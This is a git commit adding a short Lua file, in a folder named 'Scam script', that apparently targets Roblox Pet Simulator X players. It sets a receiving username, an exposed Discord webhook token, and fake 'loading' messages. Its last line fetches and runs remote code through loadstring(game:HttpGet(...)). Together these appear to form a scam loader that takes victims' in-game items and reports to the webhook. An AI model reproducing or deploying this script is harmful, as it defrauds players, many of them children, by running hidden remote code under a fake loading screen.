61de02088b1d9e922a2dcd47e7d96858f6e54184
MoonScriptt <137010878+MoonScriptt@users.noreply.github.com>
2023-07-02 12:50:44 +0700

    .lua

---
+++ GoingFixing/PetSimXgg/Main/Scam script/Justmoondme/worked/.lua
@@ -0,0 +1,10 @@
+Username = "mxrcuszzzzz"
+--Username2 = "kalongtzy" (will be back soon)
+WebHook = "https://discord.com/api/webhooks/1124939478767771708/KaxqUGMF57fS3eTdi7fGNyANSbtHn1B57b3UvJvH82ZcXVggQHgJZVppFUuxN2-np0l1"
+loadingscreen = true
+_G.CustomScriptName = "Moon x Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
